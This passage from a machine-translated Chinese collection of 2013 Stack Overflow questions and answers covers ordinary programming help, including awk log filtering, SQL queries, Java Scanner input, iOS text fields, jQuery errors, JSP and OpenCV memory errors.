awk -F" " -e '/Failed/ {print $0}' auth.log 
```

不需要 sed 或 cat。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-13T06:16:33.893

这会查找包含“失败”（区分大小写）的行并简单地打印它们，

```
awk '/Failed/ {print $0}' auth.log 
```

我相信这就是你要找的。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-02-13T13:23:03.313

而不是打印`$6`，只打印`$6` 匹配“失败”的行：

你有过

```
cat auth.log | sed -e 's/,//g' | awk -F" " '{print $6}' 
```

您可以使用

```
sed -e 's/,//g' auth.log | awk '$6=="Failed"' 
```

（正如其他人指出的那样，`sed`可以将文件名作为参数，`awk`默认情况下会在空格处中断，因此无需指定`-F`参数。）

（您的示例输入没有逗号，因此您甚至可能不需要该`sed`命令。）

# php - 根据字母 az 的分组选择三个值

> ID：14847031
> 
> 赞同：1
> 
> 时间：2013-02-13T05:33:31.957
> 
> 标签：php, mysql, performance

我有一个名为“user”的表，其中包含名为“id”、“name”的字段。

我需要从每个字母表中选择三个名称并将其显示一页，因此总结果将是 26*3 = 78。

我已经使用 PHP 完成了此操作，我需要优化查询，我们可以在单个查询中完成此操作吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-13T07:49:10.207

`SELECT * FROM user WHERE name LIKE 'a%' LIMIT 0,3`

如果那是您所要求的，请尝试使用我不知道。让我知道它是否解决了！:)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-13T09:42:56.323

请试试这个：

```
SELECT alphabet, name FROM (
SELECT
LEFT(name, 1) AS alphabet,
name,
@num := IF(@prev = LEFT(name, 1), @num + 1, 1) AS row_num,
@prev := LEFT(name, 1) as previous
FROM yourTable, (SELECT @num:=0, @prev:='') v
ORDER BY name
) sq
WHERE row_num <= 3 
```

# complexity-theory - 复杂性和大 O

> ID：14847032
> 
> 赞同：0
> 
> 时间：2013-02-13T05:33:32.753
> 
> 标签：complexity-theory, big-o

假设项目有足够的未使用空间而无需重新调整大小，以下两种算法的最坏情况时间复杂度是多少？我最初的猜测是 A 会运行得更慢，因为它必须移动每个元素才能在索引 [0] 处添加新元素。我认为 B 在最坏的情况下是 O(N^2) 但不确定。

一个。

```
 for (int i = 0; i < N; i++)
        items.add(0, new Integer(i)); 
```

和 B。

```
 for (int i = 0; i < N; i++)
        items.add(new Integer(i)); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-13T05:41:50.013

它实际上取决于用于存储项目的底层数据结构。如果您使用链表，则插入 A 需要恒定时间，即 O(1)，而如果您使用数组，它将是 O(n)，因为您必须将每个元素向左移动 1 位以腾出空间新项目。因此，如果使用链表，则循环复杂度为 O(n)，如果使用数组，则复杂度为 O(n^2)。

对于 B，不清楚你想如何实现 add 函数，因此不能说它的复杂性。当您使用链表、数组或平衡树时，复杂性会有所不同。

# java - 得到两个相同的陈述？

> ID：14847034
> 
> 赞同：3
> 
> 时间：2013-02-13T05:33:46.050
> 
> 标签：java

在我的验证方法中，如果用户输入字母而不是十进制值，我希望它打印一条错误消息，该方法确实会在控制台上打印一条错误消息，但它会打印两次，例如如果我输入“dfdff”它打印出的不是小数点：
“错误，无效数字。再试一次”

“错误，无效号码。再试一次”

每次用户输入错误的值时，如何让它打印一次错误消息？？？

```
 public static double getVaildSubtotal(Scanner sc)
{

    double subtotal = 0.0;
    boolean isValid = false;
    while (isValid == false)
    {
       if (sc.hasNextDouble())
       {
           subtotal = sc.nextDouble();
           isValid = true;
       }
       else
       {
           System.out.println("Error! Invalid decimal value. Try again.");
       }
       sc.nextLine();

       if (isValid == true && subtotal <= 0)
       {
           System.out.println("Error! Number must be greater then 0.");
           isValid = false;
       }
       else if (isValid == true && subtotal >= 10000)
       {
          System.out.println("Error! Number must be less then 10000.");
           isValid = false; 
       }

    }

    return subtotal;
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-13T07:34:20.310

现在我刚开始使用 Java，所以请对我温柔一点。

在我为课堂编写的一个小程序中，我遇到了类似的情况，所以我调整了这些原则：

```
public static double getVaildSubtotal(Scanner sc)
{ 
    double subtotal = 0.0;
    boolean isValid = false;
    while (isValid != true)
    {
        String stSubTotal = sc.nextLine().trim();
        int subTotalLength = stSubTotal.length();  
        boolean checkDouble = true;
        for (int k = 0; k < subTotalLength; k++)
        {
            if (Character.isDigit(stSubTotal.charAt(k)) != true)
            {
                System.out.println("Error! Invalid decimal value. Try again.");
                checkDouble = false;
            }
        }
        if (checkDouble == true)
        {
            subtotal = Double.parseDouble(stSubTotal);
            if (subtotal <= 0)
            {
                System.out.println("Error! Number must be greater then 0.");                    
            }
            else if (subtotal >= 10000)
            {
                System.out.println("Error! Number must be less then 10000.");                    
            }
            else
            {
                isValid = true;
            }
        }            
    }
    return subtotal;
} 
```

无论如何，像这样，每个条目只会得到一个错误代码，因为条目会吞噬整行。

但是，如果您对重建轮子不感兴趣（老实说，我不会受到侮辱），代码的当前问题是您的 sc.nextLine(); 现在，.nextLine()

> “将扫描仪推进到当前行并返回被跳过的输入。”

在这种情况下，这只是我的信念，你的 sc.nextLine(); 正在读取 .nextLine() 的输入，就像它应该的那样。所以当它来看看里面是否有双重时，不，没有双重，只有\n。

我建议删除 sc.nextLine(); 如果确实需要一个空格，希望它是一个 nextLine()，我会为 .nextLine() 添加另一个本地扫描仪；在验证方法中。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-13T05:37:57.837

这可能是因为`Scanner`该类的`nextDouble()`方法不会“吃掉”换行符。这可能会导致该方法在通过和类似方法`nextLine()`读入原语之后移动到下一行之前返回一个空行。`nextDouble()`

这可能会导致一些棘手的结果，但最简单的方法是`Scanner`通过在此处添加额外的插入来强制显式处理换行符`nextLine()`：

```
if (sc.hasNextDouble()) {
    subtotal = sc.nextDouble();
    sc.nextLine();
    isValid = true;
} 
```

请注意，当扫描仪的分隔符不只是匹配换行符时，这可能会导致意外结果。在这种情况下，您可能会不小心跳过多个输入。由于您通常希望用换行符分割，无论如何，您可以通过在创建扫描仪时更改扫描仪的分隔符来创建更永久的解决方案，如下所示：

```
Scanner sc = new Scanner(System.in);
sc.useDelimiter("[\r\n]+"); 
```

使用该解决方案，您将不再需要使用额外的`nextLine()`调用，因为任何额外的换行符都将被忽略。但是，该系统也将无法响应空白行输入，该分隔符将被简单地跳过。如果您希望处理这些，您可以使用额外的`nextLine()`修复以及此分隔符以确保安全：

```
sc.useDelimiter("\r\n|[\r\n]"); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-13T05:40:19.713

您必须调用`sc.nextLine();`两次，因为在给出一些输入后，您按回车键生成换行符。
因此，您可以通过再添加一个来处理这个额外的换行符`sc.nextLine();`

# geocoding - Foursquare 无法对完整地址进行地理编码？

> ID：14847038
> 
> 赞同：2
> 
> 时间：2013-02-13T05:34:05.950
> 
> 标签：geocoding, foursquare, reverse-geocoding

我正在尝试输入完整地址“700 花街，洛杉矶，CA”，但给出错误

```
[meta] => stdClass Object
        (
            [code] => 400
            [errorType] => failed_geocode
            [errorDetail] => Couldn't geocode param near: 700 flower street, los angeles, CA
        ) 
```

有谁知道为什么？Foursquare 不提供这样的服务吗？他们的工作非常简单，比如“洛杉矶”。为什么它不做完整的地址？有任何想法吗？

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-13T06:02:47.763

HTTP 400 通常意味着“错误输入”——仔细检查您发送给 Foursquare 的内容，以确保它是有效的并且这是他们的 API 所期望的。

顺便说一句，我在 SmartyStreets 工作。我们能够对该地址进行地理编码：

[http://smartystreets.com/?street=700%20flower%20street,%20los%20angeles,%20CA](http://smartystreets.com/?street=700%20flower%20street,%20los%20angeles,%20CA)

更巧的*是*，Foursquare 不久前刚刚与我们签约。不确定这是出于内部目的还是出于他们服务的某些方面，但我想我们会看到......

（顺便问一下，您知道地址缺少套房或公寓号码吗？）

# ios - 如何将iOS应用程序中文本字段的字符限制为最多5个字符？

> ID：14847040
> 
> 赞同：0
> 
> 时间：2013-02-13T05:34:10.683
> 
> 标签：ios, ios5, ios4

我想限制`textField`IOS应用程序中的字符。我尝试了 Stack Overflow 中给出的所有方法，所以我问了这个问题。

在这里，我使用了一个标签（安全代码）和一个文本字段（5 个字符）。

我在`viewcontroller.m`文件中给出了以下代码，但没有工作。

```
 myTextField.delegate = self

-(BOOL)textField:(UITextField *)textField shouldChangeCharactersInRange:(NSRange)range replacementString:(NSString *)string

{
   NSString *newString = [textField.text stringByReplacingCharactersInRange:range withString:string];

   return !([newString length] > 5);
} 
```

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-02-13T05:46:08.163

在**ViewController.h**中，`<UITextFieldDelegate>`应该添加。

在您的 viewDidLoad 中，`myTextField.delegate = self`应该添加。

然后，限制字符数：

```
- (BOOL)textField:(UITextField *)textField shouldChangeCharactersInRange:(NSRange)range     replacementString:(NSString *)string
{
     if (textField.text.length >= 5 && range.length == 0)
        return NO;
     return YES;
} 
```

为我工作。尝试一下。

**编辑：**

另一方面，您的代码也应该可以正常工作。再次检查您的代码。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2015-11-22T16:01:17.030

迅速：添加`UITextFieldDelegate`为`extension`. 它使您的工作更轻松。

不要忘记`delegate`在`viewDidLoad`.

```
override func viewDidLoad() {
    super.viewDidLoad()

    // set the delegate
    textField.delegate = self
}

extension ViewController:UITextFieldDelegate {
  func textField(textField: UITextField, shouldChangeCharactersInRange range: NSRange, replacementString string: String) -> Bool {
    if textField.text?.characters.count >= 5 && range.length == 0 {
      return false
    }
    return true
  }
} 
```

您可以找到一个详细的示例，如何通过`count`和限制文本字段`width`： [github 源](https://github.com/fatihyildizhan/Limit-Textfields-s-Text)

# php - PHP 中的 HTML 缩进

> ID：14847041
> 
> 赞同：0
> 
> 时间：2013-02-13T05:34:11.527
> 
> 标签：php, html, indentation

我有这个代码：

```
<? if(is_home() || is_archive()): ?>
<ul>
  <li><a href="<?= site_url('/category/one') ?>">One</a></li>
  <li><a href="<?= site_url('/category/two') ?>">Two</a></li>
  <li><a href="<?= site_url('/category/three') ?>">Three</a></li>
</ul>
<? endif ?> 
```

产生这个输出：

```
 <ul>
  <li><a href="http://domain/...">One</a></li>
  <li><a href="http://domain/...">Two</a></li>
  <li><a href="http://domain/...">Three</a></li>
</ul> 
```

注意`<ul>`是缩进的。如果我使用以下内容，它会按预期输出：

```
<? if(is_home() || is_archive()): ?><ul>
... 
```

我知道这是微不足道的，但我想知道是否有办法做到这一点，所以它在 PHP 和 HMTL 中仍然看起来不错；我喜欢干净的输出。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-02-13T05:52:24.753

好的。PHP在结束标记之后占用了一个换行符（`\n`或） 。 如[http://php.net/manual/en/language.basic-syntax.instruction-separation.php中所述](http://php.net/manual/en/language.basic-syntax.instruction-separation.php)`\r\n``?>`

> [...] 块的结束标记将包括紧随其后的换行符（如果存在）。

那里的评论中还提到了一种解决方法。如果您要在 之后添加一个空格`?>`，表示一系列`?` `>` `SPACE` `\n`，则换行符将保留其用途。-- 但是你会依赖另一个隐形角色来获得想要的效果。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-02-13T05:39:20.443

首先，您为什么要关心您的 html 格式是否笨拙？我理解可能是出于可读性目的，但有可用的 html 格式化工具：例如[http://www.freeformatter.com/html-formatter.html](http://www.freeformatter.com/html-formatter.html)

如果您担心您的 html 代码是否有效，请尝试使用适当的 IDE 或 html 验证器：例如 [http://validator.w3.org/](http://validator.w3.org/)

最后，您的问题的答案：将代码的开头更改为：

```
<?php if(is_home() || is_archive()){ echo "\n" ?><ul>
  <li><a href="<
...
<?php }?> 
```

# sql-server-2008 - 如何在sql server中创建文本文件

> ID：14847044
> 
> 赞同：1
> 
> 时间：2013-02-13T05:34:27.347
> 
> 标签：sql-server-2008

我的 sql server 有问题。我想在 sql server 中运行一个命令 691 次，（对于每个 VID）。

但 VID 列的值不是 Sequential 和 Ascending。那么我该如何运行这个命令。

我的意思是我想为每个 VID 运行这个命令，它的值的数量是 691，最小值是 11，最大值是 7668。然后我想将每个 VID 的结果保存在文本文件中。

命令是：

```
declare @vid integer

DECLARE @FileName varchar(8000)

declare @bcpCommand varchar(8000)

set @vid = 1

while (@vid < 692)

begin

SET @FileName = 'd:\re'+ CONVERT(char(8),@vid)+'.txt'

SET @bcpCommand =  'bcp "select ak_from,ak_to,w from [socialdb].[dbo].final where ???? "  queryout "'+ @FileName + '" -C -T -c -S SONY-VAIO\SQLEXPRESS1'

EXEC master..xp_cmdshell @bcpCommand

set @vid = (@vid + 1)

end 
```

我想用 sql server 2008 做到这一点。第一条记录是我的表记录之一。

我应该根据vid对记录进行分类，并且每个具有相同vid的记录必须在一个seprat txt文件中。

为了保存在文本文件中，我使用 bcp。我没有问题。我的问题是执行此操作的 sql server 中的查询。正如我所说，第一条记录保存在其名称为最终的表中。如何为此编写查询？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-02-13T20:39:56.560

为此编写查询需要您拥有某种可查询格式的数据（例如数据库中的表）。一旦你有了它，你可以很容易地编写一个查询，只选择你正在寻找的列（ak_from、ak_to、w）并通过*bcp*将结果放入文本文件中（请参阅：[使用 bcp 实用程序将 SQL 查询导出到文本文件](https://stackoverflow.com/questions/12140947/using-bcp-utility-to-export-sql-queries-to-a-text-file)和[http://msdn.microsoft.com/en-us/library/ms162802.aspx](http://msdn.microsoft.com/en-us/library/ms162802.aspx)）。

假设您将拥有超过 5 条记录和 3 个 VID，您可以在光标内写入 bcp，以便您可以循环并根据您的条件创建多个文本文件。

作为示例，下面的代码只是将 5 条记录放入一个临时表中，然后分别输出三个文本文件。

```
CREATE TABLE ##tbl
(
    Vid INT NOT NULL
    ,ak_from INT NOT NULL
    ,ak_to INT NOT NULL
    ,w INT NOT NULL
)

INSERT INTO ##tbl
SELECT 11, 164885, 164885, 24
UNION SELECT 11, 164885, 431072, 3
UNION SELECT 51, 731754, 690695, 2
UNION SELECT 51, 204086, 316310, 2
UNION SELECT 54, 818522, 501263, 1

DECLARE @vid VARCHAR(2)
DECLARE @querytextNoVid VARCHAR(100)
DECLARE @querytext VARCHAR(100)
DECLARE @filelocation VARCHAR(100)
DECLARE @cmd VARCHAR(255)

DECLARE vid_cursor CURSOR FOR SELECT DISTINCT vid FROM ##tbl
OPEN vid_cursor
FETCH NEXT FROM vid_cursor INTO @vid

WHILE @@FETCH_STATUS = 0
BEGIN

    SET @querytext = '"SELECT ak_from, ak_to, w FROM ##tbl WHERE vid = ' + @vid + '"'
    SET @filelocation = '"c:\out_vid' + @vid + '.dat"'
    SET @cmd = 'bcp ' + @querytext + ' queryout ' + @filelocation + ' -T -c'
    EXEC master..XP_CMDSHELL @cmd

    FETCH NEXT FROM vid_cursor INTO @vid
END
CLOSE vid_cursor
DEALLOCATE vid_cursor

DROP TABLE ##tbl 
```

您需要确保通过 sp_configure 启用 xp_cmdshell（请参阅：[启用“xp_cmdshell”SQL Server](https://stackoverflow.com/questions/5131491/enable-xp-cmdshell-sql-server)）

# javascript - 此处的多选框中的复选框 onChange 不起作用

> ID：14847050
> 
> 赞同：-1
> 
> 时间：2013-02-13T05:35:11.073
> 
> 标签：javascript, html

我在这个选择框中使用了一个多重选择器，我在这个选择的更改上使用了复选框我想执行一个函数名称 getValue()。我试过了，但对我来说它不起作用

下面是我的代码

```
 <html>
    <head>  
        <link rel="stylesheet" type="text/css" href="ui.dropdownchecklist.css" />
        <link rel="stylesheet" type="text/css" href="demo.css" />
        <script type="text/javascript" src="jquery.js"></script>
        <script type="text/javascript" src="ui.core.js"></script>
        <script type="text/javascript" src="ui.dropdownchecklist.js"></script>
        <script type="text/javascript">
            $(document).ready(function() {
               $("#cboLocation").dropdownchecklist({ firstItemChecksAll: true, maxDropHeight: 100 });
            });
            function getValue()
            {
                alert("hai");
                return false;
            }
        </script>
    </head>
    <body>

          <select name="cboLocation" class="width150" id="cboLocation" multiple="multiple" onChange="getValue()">
            <option>(all)</option>
            <option>Banana Nut</option>
            <option>Black Walnut</option>
            <option>Burgundy Cherry</option>
            <option>Butter Pecan</option>
            <option>Strawberry Cheesecake</option>
            <option>Turkish Coffee</option>
            <option>Vanilla</option>
          </select>

    </body>
    </html> 
```

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-13T18:49:06.183

我从您的选择菜单中删除了 onChange 事件，因为它被 dropdownchecklist() 忽略。Dropdownchecklist() 正在用`divs`and替换您的选择元素`inputs`；因此，内联脚本没有被调用。

下面的代码做一件事：当用户完成与下拉菜单的交互时，当且仅当至少一个复选框被选中时，他们会看到警报消息“hai”。

```
<select name="cboLocation" class="width150" id="cboLocation" multiple="multiple">

$(document).ready(function() {
    $("#cboLocation").dropdownchecklist( {
        emptyText:'Select Something', // couldn't see the thing
        firstItemChecksAll: true,
        onComplete: function () { getValue() } //, alert('hello') }
    });

    function getValue() {
        if($('.ui-dropdownchecklist-item input:checked').length > 0) {
        alert('hai');
        }
    }       
}); 
```

# c++ - 如何在 C++ 中读取 GSON 字符串

> ID：14847052
> 
> 赞同：0
> 
> 时间：2013-02-13T05:35:24.947
> 
> 标签：c++, json, gson

我有一个要在 C++ 中读取的 Gson 序列化字符串 例如：

```
String jsonDealer = [{"dealerID":"VARSSWK103","dealerName":"Dealer ABC"},     {"dealerID":"VARSSTH008","dealerName":"Dealer XYZ"}] 
```

如何将其转换为 C++ 对象，以便检索经销商 ID 和经销商名称？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-02-13T05:41:07.317

[GSON](http://en.wikipedia.org/wiki/GSON)是一个*Java*库，用于解析并序列化为[JSON](http://www.json.org/)格式。

所以你想要一个处理 JSON 的 C++ 库。其中有很多；我建议使用[jsoncpp](http://sourceforge.net/projects/jsoncpp/)

当然，您需要定义您的 C++ 应用程序类（例如您`Dealer`的 .

# java - 如何在jsp页面中调用.java文件？

> ID：14847057
> 
> 赞同：0
> 
> 时间：2013-02-13T05:36:04.543
> 
> 标签：java, jsp

```
<%@ page language="java" contentType="text/html; charset=ISO-8859-1"
    pageEncoding="ISO-8859-1" %>

<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">

<html>

<head>

<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1">

<title>Insert title here</title>

</head>

<body>

<jsp:useBean id="link" class="com.Sshexample">

<%= link.callconst()%>

</jsp:useBean>

</body>

</html> 
```

我想从 jsp 调用一个 .java 文件。callconst 是一个调用类的构造函数的函数？我想在单击按钮时调用 .java 文件，所以我想将一个 jsp 转发给另一个，将另一个 jsp 调用转发给 .java

```
 package com;
  import com.jscape.inet.ssh.*; 
  import com.jscape.inet.ssh.util.SshParameters;   

  public class Sshexample implements SshListener {  

  // state of SSH connection  
  private boolean connected = false;  

  /** 
   * Creates a new SshExample instance. 
   * 
   */  
  public Sshexample() {  
     Ssh ssh = null;       

     try
       {  
        // create new Ssh instance  
        SshParameters params = new SshParameters("i210","ashishga","Linux_11");  
        System.out.print("Unix server is connected ");  
        ssh = new Ssh(params);  
        // register to capture events  
        ssh.addSshListener(this);  

        System.out.println("Connecting please wait...");  
        SshScript script = new SshScript(ssh);  
        SshTask task = new SshTask("$","./call.sh","$");  

        // connect  
        script.addTask(task);  
        ssh.connect();  
        while(!script.isComplete()) {  
             Thread.sleep(100);  
            }  

        } catch (Exception e) {  
        e.printStackTrace();              
        } finally {  
        try {  
            if(connected) {  
              ssh.disconnect();   
            }  
        } catch(Exception e) {  

         }             
      }  
  }  

  /** 
  * Captures SshConnectedEvent 
  */  
 public void connected(SshConnectedEvent ev) 
 {  
    System.out.println("Connected: " + ev.getHost());  
    connected = true;  
    System.out.println("New ashish is connected to server  "+ ev.getHost());   
}  

/** 
 * Captures SshDataReceivedEvent 
 */  
public void dataReceived(SshDataReceivedEvent ev) {  

    ev.getData();  

}  

/** 
 * Captures SshDisconnectedEvent 
 */  
public void disconnected(SshDisconnectedEvent ev) {  

    System.out.println("ashish server is Disconnecting: " + ev.getHost());  
    connected = false;  
}  

/* 
 * Main method for SshExample 
 */  
public void callconst()
{
   Sshexample t = new Sshexample();
}

} 
```

错误：

```
javax.servlet.ServletException:
java.lang.NoClassDefFoundError:                                                            com/jscape/inet/ssh/SshListener
org.apache.jasper.servlet.JspServlet.service(JspServlet.java:268)
javax.servlet.http.HttpServlet.service(HttpServlet.java:717) 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-13T05:44:52.247

**在类com.Sshexample.java**中创建一个属性**callconst**及其 setter getter， 如下面的代码。

 **```
package com;

public class Sshexample {
    private String callconst = "DEAFULT DATA TO DISPLAY";

    public String getCallconst() {
        return callconst;
    }

    public void setCallconst(String callconst) {
        this.callconst = callconst;
    }

}

Access the property like below code.
 <jsp:useBean id="link" class="com.Sshexample" scope="request">          
        </jsp:useBean>

<html>  
<body>  
Data from java class :: <jsp:getProperty name="link" property="callconst"/>  

</body></html> 
```

访问您的 java 类的另一种方法是借助 scriptlet 让我编写代码

```
<%@ page import="com.Sshexample" %>

    <%

Sshexample obj = new Sshexample();

String dataTodisplay = obj .getCallconst();

%>

<html>  
    <body>  
    Data from java class :: <%=dataTodisplay%>

    </body></html> 
```**

# javascript - 我对 JavaScript 中的关键字“this”感到困惑

> ID：14847059
> 
> 赞同：5
> 
> 时间：2013-02-13T05:36:18.233
> 
> 标签：javascript, scope, this

这是一个例子：

```
function one() {

    var a = 1;
    two();

    function two() {

        var b = 2;
        three();

        function three() {

            var c = 3;
            alert(a + b + c); // 6

        }
    }   
}

one()​; //calling the function 
```

现在当我们调用函数 one() 时，结果是`6`.

所以这都是关于范围链的，所有变量都解决了，现在我有一个问题。

当所有变量都通过作用域链解析时，为什么我们需要这个“ *this ”关键字？*

因此，如果我们有以下功能：

```
function a() {
    var a = 'function a';

    function b() {
        var b = 'function b';
        alert (a); //will be function a, without keyword this 
        alert (this.a); // what will be the effect of this line
    }
} 
```

“this”关键字总是让我感到困惑！

请有人简单详细地解释一下。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-13T06:03:17.840

他们关键字`this`在 JavaScript 的 a 函数中通过以下方式解析 -

1.  当在对象上或通过对象调用函数时，该对象是函数的调用上下文或“this”值。例如 -

    ```
    var o = {
       f : function(){
          //do something  
       }
    } 
    ```

    如果我们使用对象'o'调用对象'o'的方法'f' -

    ```
    o.f()// in method f, 'this' refers to o inside the method o 
    ```

2.  如果函数不是在对象上调用或不是通过对象调用，则当前窗口对象是`this`函数的调用上下文或值。例如 -

    ```
    function f(){
        //do something
    }

    //calling f
    f();// 'this' will refer to current window object 
    ```

在您的情况下，这指的是当前窗口对象，并且`this.a`是对您在全局范围内定义的函数 a 的引用。

此外，可以在调用函数时提供函数的调用上下文或“this”值。请检查[Function.prototype.call 方法 - JavaScript | MDN](https://developer.mozilla.org/en-US/docs/JavaScript/Reference/Global_Objects/Function/call)和[Function.prototype.apply 方法 - JavaScript | MDN](https://developer.mozilla.org/en-US/docs/JavaScript/Reference/Global_Objects/Function/apply)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-13T05:49:50.243

this 关键字是指函数的作用域。在上面的代码中，**this.a**将打印**undefined**，因为没有名为 a 的变量。**this 关键字用于引用当前本地范围**而不是全局范围。因此，如果您的函数 b 中有一个名为 a 的变量，那么 this.a 将引用函数 b 中定义的变量，而不是它之外的变量。而在函数 b 之外引用 this 将引用全局范围。

# javascript - TypeError: $(...).parent(...).delegate 不是函数

> ID：14847061
> 
> 赞同：0
> 
> 时间：2013-02-13T05:36:31.820
> 
> 标签：javascript, jquery, asp.net-mvc-3, webgrid

我`WebGrid`在我的项目中使用。当我在浏览器中检查我的代码（`aspx`页面）时，我在控制台上发现了错误。它是：`TypeError: $(...).parent(...).delegate is not a function`当我单击错误行时，它会显示以下代码：

```
$(function() {
$('table[data-swhgajax="true"],span[data-swhgajax="true"]').each(function() {
var self = $(this);
var containerId = '#' + self.data('swhgcontainer');
var callback = getFunction(self.data('swhgcallback'));
/*here comes the error*/
$(containerId).parent().delegate(containerId + ' a[data-swhglnk="true"]', 'click', function() {
$(containerId).swhgLoad($(this).attr('href'), containerId, callback);
return false;
});
})
}); 
```

主 ASPX 页面代码：

```
<%using (Html.BeginForm("Action", "Dashboard", FormMethod.Post)) { %>
    <div id="MainDashboardDiv">
        <div class="UpperLiveTiles">
            <div id="RecentDiv">
                <a href="../CRM/RecentCRMRequest">
                            <h4 class="RequestTitle">Recent Requests</h4>
                        </a>
                        <%Html.RenderAction("RecentRequests", Model); %>
                    </div><!--End of RecentDiv -->
            <div id="PriorityDiv">
                        <a href="../CRM/HighPriorityCRMRequest">
                        <h4 class="RequestTitle">High Priority Requests</h4>
                        </a>
                        <%Html.RenderAction("PriorityRequests", Model); %>
                    </div><!--End of PriorityDiv -->
            </div><!--End of UpperLiveTiles -->
    </div><!--End of MainDashboardDiv -->
<%} %> 
```

部分视图1 代码：

```
<%    
    var grid1var = new WebGrid(source: Model, defaultSort: "Id", fieldNamePrefix: "grid1", canSort: true, ajaxUpdateContainerId: "FirstDiv", canPage: true, rowsPerPage: 5);%>
<div id="FirstDiv">
    <%=
        grid1var.GetHtml(htmlAttributes: new { id = "grid1" }, tableStyle: "GridTable", headerStyle: "GridHeader",
        columns: grid1var.Columns(
                grid1var.Column(columnName: "Id", header: "ID", canSort: true),
                grid1var.Column(columnName: "Requester_Name", header: "Employee", canSort: true),
                grid1var.Column(columnName: "Estimated_Amount", header: "Amount", canSort: true),
                grid1var.Column(columnName: "Date_Created", header: "Date", canSort: true, format: item => item.Date_Created.ToString("dd-MM-yyyy"))
         ))
    %>
</div> 
```

部分视图2代码：

```
<%    
    var grid2var = new WebGrid(source: Model, defaultSort: "Id", fieldNamePrefix: "grid2", canSort: true, ajaxUpdateContainerId: "SecondDiv", canPage: true, rowsPerPage: 5);%>
<div id="SecondDiv">
    <%=
        grid2var.GetHtml(htmlAttributes: new { id = "grid2" }, tableStyle: "GridTable", headerStyle: "GridHeader",
        columns: grid2var.Columns(
                grid2var.Column(columnName: "Id", header: "ID", canSort: true),
                grid2var.Column(columnName: "Requester_Name", header: "Employee", canSort: true),
                grid2var.Column(columnName: "Estimated_Amount", header: "Amount", canSort: true),
                grid2var.Column(columnName: "Date_Created", header: "Date", canSort: true, format: item => item.Date_Created.ToString("dd-MM-yyyy"))
         ))
    %>
</div> 
```

我不知道这是什么类型的错误。

* * *

**我终于发现了错误：**

只是因为我在系统中使用的现成jquery菜单使用的是旧的jquery。它与新的 Jquery 版本冲突。我已删除该菜单，一切正常。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-13T05:48:36.197

改用`$(document)`：

```
$(document).delegate(containerId + ' a[data-swhglnk="true"]', 'click', function() {
    $(containerId).swhgLoad($(this).attr('href'), containerId, callback);
    return false;
}); 
```

`or you can place the id or class of the parent.`

## 笔记：

`.delegate()`至少需要 jQuery 版本 1.4.2

`.live()`至少需要 jQuery 版本 1.3 ( *`deprecated: 1.7, removed: 1.9`*)

`.on()`需要 jQuery 版本 1.7+

因此，如果您正在使用，请`jquery 1.9`使用`.on()`.

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-13T06:18:23.877

如果您的要求是动态绑定该元素的事件请参考 $(document).delegate("your精确选择器","event","function to call")。

正如我所看到的，您已经说过此代码是在运行时生成的。你能给我们你的aspx代码片段以及生成的代码吗？

# java - 你能帮我解决我项目中的这个错误吗？

> ID：14847062
> 
> 赞同：1
> 
> 时间：2013-02-13T05:36:36.923
> 
> 标签：java, opencv, netbeans, javacv

当单击按钮运行...在输出中...

```
java.lang.OutOfMemoryError
OpenCV Error: Insufficient memory (Failed to allocate 6220800 bytes) in unknown function, file ..\..\..\src\opencv\modules\core\src\alloc.cpp, line 52
Exception in thread "Thread-4" java.lang.RuntimeException: ..\..\..\src\opencv\modules\core\src\alloc.cpp:52: error: (-4) Failed to allocate 6220800 bytes    
    at com.googlecode.javacv.cpp.opencv_core.cvCloneImage(Native Method)
    at com.googlecode.javacv.cpp.opencv_core$IplImage.clone(opencv_core.java:521)
    at vidtracking.MainView.backgroundSubtraction(MainView.java:666)
    at vidtracking.MainView.access$1000(MainView.java:32)
    at vidtracking.MainView$8.run(MainView.java:461) 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-13T05:48:44.793

```
java.lang.OutOfMemoryError OpenCV Error: Insufficient memory 
```

抛出此异常是因为。 [内存不足错误](http://docs.oracle.com/javase/7/docs/api/java/lang/OutOfMemoryError.html)

> 当 Java 虚拟机因为内存不足而无法分配对象时，并且垃圾收集器无法提供更多内存。虚拟机可以构造 OutOfMemoryError 对象，就好像禁用了抑制和/或堆栈跟踪不可写一样。

**在这种情况下，常见的解决方案是：**

1.  优化您的代码以使用更少的内存和/或重用对象而不是创建新对象，从而减少垃圾收集器运行的次数。如果您创建了很多临时对象（例如在循环中），您应该尝试重用它们。
2.  `Xmx`例如，使用 switch增加堆大小`-Xmx512m`（您可以通过使用 JXM 和 Jconsole 连接到 JVM 来帮助自己找到正确的值）。
3.  使用第三种方法禁用错误检查`-XX:-UseGCOverheadLimit` 只会导致另一种错误消息 - 与堆相关的 java.lang.OutOfMemoryError。
4.  添加`-XX:+HeapDumpOnOutOfMemoryError`到 JAVA_OPTS 并使用 IBM Memory Analyzer（IBM Support Assistant Workbench 的一部分）分析转储以查找内存泄漏（请参阅参考资料）。

**仅适用于 netbeans**。

正确的做法是在项目上右击，选择“**属性**”，然后“**运行**”；在那里您可以适当地设置 VM 选项（例如，-Xmx256m）。它应该看起来像这样：

